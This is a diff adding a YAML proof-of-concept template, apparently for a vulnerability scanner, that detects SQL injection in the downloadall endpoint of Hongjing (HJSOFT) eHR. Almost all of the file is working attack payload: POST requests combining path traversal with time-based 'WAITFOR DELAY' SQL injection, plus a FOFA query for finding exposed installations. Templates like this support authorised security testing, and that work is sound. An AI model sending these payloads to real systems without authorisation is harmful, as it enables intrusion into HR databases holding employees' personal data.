@@ -1,0 +1,31 @@
+id: poc-yaml-hjsoft-ehr-downloadall-sqli
+info:
+  name: 宏景eHR downloadall SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /templates/attestation/../../sys/downloadall
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: ext=1&filenamecolumn=1&content=1&tablename=master.dbo.sysdatabases&fileid=1&id=1';WAITFOR
+    DELAY '0:0:{{.t1}}'--
+  expression: "status_code == 200 && \nduration >= t1 &&\nduration <= t2 &&\nbody\
+    \ == \"\"\n"
+- method: POST
+  path: /templates/attestation/../../sys/downloadall
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: ext=1&filenamecolumn=1&content=1&tablename=master.dbo.sysdatabases&fileid=1&id=1';WAITFOR
+    DELAY '0:0:{{.t3}}'--
+  expression: "status_code == 200 && \nduration >= t3 &&\nduration <= t4 &&\nbody\
+    \ == \"\"\n"
+transport: http
